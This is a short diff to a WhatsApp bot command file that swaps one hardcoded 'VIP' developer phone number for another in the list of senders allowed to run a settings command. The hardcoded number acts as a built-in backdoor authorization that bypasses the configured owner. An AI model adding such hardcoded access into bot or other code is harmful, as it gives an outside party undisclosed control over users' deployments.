@@ -4,7 +4,7 @@ import { setSetting } from '../../lib/settings.js';
 const EditNumCmd = async (m, Matrix) => {
   try {
     const botNumber = await Matrix.decodeJid(Matrix.user.id);
-    const dev = '923253617422@s.whatsapp.net'; // VIP number
+    const dev = '254717263689@s.whatsapp.net'; // VIP number
     const isAuthorized = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', dev].includes(m.sender);
 
     const prefix = config.PREFIX;
